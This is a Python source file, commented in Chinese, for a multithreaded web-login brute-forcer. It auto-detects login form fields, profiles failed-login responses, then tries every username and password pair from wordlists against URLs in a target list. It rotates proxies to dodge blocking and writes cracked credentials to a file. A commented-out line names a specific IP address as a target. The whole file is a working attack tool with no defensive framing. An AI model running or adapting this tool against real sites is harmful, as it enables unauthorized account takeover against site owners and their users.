import difflib
import re
import threading
import time
import traceback

import requests
import urllib3
import urllib3.exceptions

from utils import print_inf, fixrespo, print_err, print_suc, getproxy, init_headers, str_sim

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
pac = 0
debug = False
output = open('brute_output_suc.res', 'w+')
output_err = open('brute_output_err.res', 'w+')
bf_res = ''
bf_err_res = ''
proxy = None
exit = False
headers = init_headers
timeout = 10


def getproxy_(timen):
    while True:
        if exit:
            return 1
        proxy = getproxy()
        time.sleep(timen)


def autosetproxy(timen=60):
    t = threading.Thread(target=getproxy_, args=(timen,))
    t.start()




def fix_url(url, prefix='http'):
    url = url.replace('\n', '')
    url = url.replace('\r', '')
    url = url.replace('\t', '')
    if 'http' not in url:
        url = '%s://%s' % (prefix, url)
    if url[-1] == '/':
        url = url[0:-1]
    return url


def ckhavevfcd(resp):
    for it in open('judg/verifycode.list', 'r', encoding='utf-8').readlines():
        it = fixrespo(it)
        if it in resp:
            return True
    return False


def ckisloginsuc(resp):
    for it in open('judg/suc.list', 'r', encoding='utf-8').readlines():
        it = fixrespo(it)
        if it in resp:
            return True
    return False


def ckisloginerr(resp):
    for it in open('judg/err.list', 'r', encoding='utf-8').readlines():
        it = fixrespo(it)
        if it in resp:
            return True
    return False


def getrawurl(url: str):
    prefix = ''
    if 'http://' in url:
        prefix = 'http://'
    elif 'https://' in url:
        prefix = 'https://'
    else:
        prefix = 'http://'
    url = url.replace('https://', '')
    url = url.replace('http://', '')
    if debug:
        print_err('rawurl:%s' % url)
    if '/' in url:
        url = url.split('/')[0]
    return '%s%s' % (prefix, url)


def sendform(una, pwd, url, agr='http', used=False):
    global pac, proxy
    try:
        res = requests.get(fix_url(url, agr), timeout=timeout, proxies=proxy, verify=False, headers=headers).text
        res = fixrespo(res)  # 修复包
        if debug:
            print(res)
        if ckhavevfcd(res):
            print_err('%s存在验证码' % url)
            return None
        for it in re.findall('<(.*?)>', res):
            if debug:
                print(it)
            if 'form' in it and 'method="' in it and 'action="' in it:
                method = re.findall('method="(.*?)"', it)[0]
                action = re.findall('action="(.*?)"', it)[0]
                if debug:
                    print_err(res)
                    print_err(method)
                    print_err(action)
                form_body = re.findall('<form(.*?)</form', res)[0]
                pwd_form_nam = ''
                una_form_nam = ''
                una_maxn = 0.0
                pwd_maxn = 0.0
                for it in re.findall('name="(.*?)"', form_body):
                    # if str_sim('username', it) > str_sim('password', it):
                    #     una_form_nam = it
                    # else:
                    #     pwd_form_nam = it
                    u_sim = str_sim('username', it)
                    p_sim = str_sim('password', it)
                    if u_sim > una_maxn:
                        una_maxn = u_sim
                        una_form_nam = it
                    if p_sim > pwd_maxn:
                        pwd_maxn = p_sim
                        pwd_form_nam = it
                data = {
                    una_form_nam: una,
                    pwd_form_nam: pwd
                }  # 构造表单数据
                rawurl = getrawurl(url)
                if action[0] == '/':
                    action = action[1:len(action)]
                if debug:
                    print_err("%s -> %s" % (data, '%s/%s' % (rawurl, action)))
                if 'post' in method:
                    return {'text': fixrespo(
                        requests.post('%s/%s' % (rawurl, action), data=data, verify=False, proxies=proxy,
                                      timeout=timeout, headers=headers).text), 'data': data, 'url': url,
                        'arg': 'post'}
                elif 'get' in method:
                    return {'text': fixrespo(
                        requests.get('%s/%s' % (rawurl, action), data=data, verify=False, proxies=proxy,
                                     timeout=timeout, headers=headers).text), 'data': data, 'url': url,
                        'arg': 'get'}
                else:
                    print_err('未找到post/get方法')
                    if debug:
                        print('method:%s' % method)
                    return None
    except requests.exceptions.ReadTimeout:
        print_err('连接超时')
        return None
    except urllib3.exceptions.ConnectionError:
        print_err('连接错误')
    except:
        if debug:
            traceback.print_exc()
        if used:
            print_err('无法抓取关键信息')
            return None  # 防锁
        return sendform(una, pwd, url, 'https', True)  # 切协议


def getp_errjgrate(url: str, n=6):
    inc_pwd = '8WADsg1o'  # 八位
    c_uname = 'admin'
    ave_incor = 0.0
    max_minus = 0.0
    r = []
    try:
        for i in range(0, n):
            if debug:
                print_inf('发送试验包%s' % str(i + 1))
            prefix = 'http'
            if 'http' in url:
                prefix = 'http'
            if 'https' in url:
                prefix = 'https'
            ra = sendform(una=c_uname, pwd=inc_pwd, url=url, agr=prefix)['text']
            if ra is None:
                print_err('发包错误 或许是网站采用了前端加密传输')
                return None
            r.append(fixrespo(ra))
        max = 0.0
        min = 1.0
        for it in r:
            sim = str_sim(r[0], fixrespo(it))
            if sim > max:
                max = str_sim(r[0], fixrespo(it))
            elif sim < min:
                min = str_sim(r[0], fixrespo(it))
            ave_incor += sim
            # print(str_sim(r[0], fixrespo(it)))
        max_minus = max - min
        ave_incor = ave_incor / n  # 计算平均错误率
        return {
            'pg': r[0],
            'rate': ave_incor - (3 * max_minus)
        }
    except TypeError:
        print_err('判定失败 或许是网站采用了前端加密传输')
    except:
        if debug:
            traceback.print_exc()
        return None


def bf(url):
    global bf_res, bf_err_res
    proxy_inside = None
    url = fix_url(url)
    try:
        print_inf('开始爆破%s' % url)
        inc_resp = getp_errjgrate(url, n=3)
        if inc_resp is None:
            print_err('因错退出%s' % url)
            return None
        print_inf('找到爆破点')
        # threads = []
        prefix = 'http'
        if 'http' in url:
            prefix = 'http'
        if 'https' in url:
            prefix = 'https'
        ra = sendform(una='get', pwd='get', url=url, agr=prefix)
        if debug:
            print(ra)
        for una in open('una.list', 'r').readlines():
            for pwd in open('pwd.list', 'r').readlines():
                una = fixrespo(str(una))
                pwd = fixrespo(str(pwd))
                autharg = ra.get('arg')
                r_url = ra.get('url')
                r_data = ra.get('data')
                # print(auth)
                # print(r_url)
                # print(r_data)
                if debug:
                    print(autharg)
                # print('1:%s' % r)
                # print('2:%s' % inc_resp.get('pg'))
                resqdata = r_data
                una_key = ''
                pwd_key = ''
                for it in resqdata.keys():
                    if str_sim('password', it) > str_sim('username', it):
                        pwd_key = it
                    elif str_sim('password', it) < str_sim('username', it):
                        una_key = it
                resqdata = {
                    una_key: una,
                    pwd_key: pwd
                }
                response1 = ''
                while True:  # 重试
                    try:
                        if 'get' in autharg:
                            response1 = requests.get(url=r_url, data=resqdata, headers=headers, proxies=proxy_inside,
                                             verify=False,
                                             timeout=timeout).text
                        elif 'post' in autharg:
                            response1 = requests.post(url=r_url, data=resqdata, headers=headers, proxies=proxy_inside,
                                              verify=False,
                                              timeout=timeout).text
                        else:
                            return None
                        break
                    except requests.exceptions.ConnectionError:
                        proxy_inside = getproxy()
                    except requests.exceptions.ReadTimeout:  # 错误重试
                        proxy_inside = getproxy()
                if str_sim(fixrespo(response1), fixrespo(inc_resp.get('pg'))) < inc_resp.get('rate'):
                    if debug:
                        print(fixrespo(inc_resp.get('pg')))
                        print(fixrespo(response1))

                    if len(response1) > 16 and ckisloginsuc(response1) and not ckisloginerr(response1):
                        print_suc('爆破成功 %s -> %s:%s' % (url, una, pwd))
                        print_inf(response1)
                        bf_res += '%s -> %s:%s' % (url, una, pwd)
                        output.write(bf_res)  # 写入文件

                        return {una: una, pwd: pwd}
                    else:
                        # print_err('%s -> %s:%s' % (url, una, pwd))
                        pass
    except:
        # traceback.print_exc()
        print_err('%s爆破失败' % fix_url(url))
        bf_err_res += '%s\n' % fix_url(url)


def bf_lots(urls: list, thr_max=50):
    print_inf('线程最大%s' % thr_max)
    print_inf('共计%s' % len(urls))
    tl = []
    thr_n = 0
    i = 0
    for it in urls:
        tl.append(threading.Thread(target=bf, args=(it,)))
    threads_starting = []
    for thread in tl:
        i += 1
        while True:
            if thr_n < thr_max:
                print_inf('%s/%s' % (i, len(urls)))
                thread.start()
                threads_starting.append(thread)
                thr_n += 1
                break
            for t_starting in threads_starting:
                if not t_starting.is_alive():
                    threads_starting.remove(t_starting)
                    thr_n -= 1


if __name__ == '__main__':
    autosetproxy()  # 自动切换代理
    time.sleep(3)
    # bf('https://60.248.238.11:10443')
    bf_lots(open('crack_target.list').readlines())
    exit = True
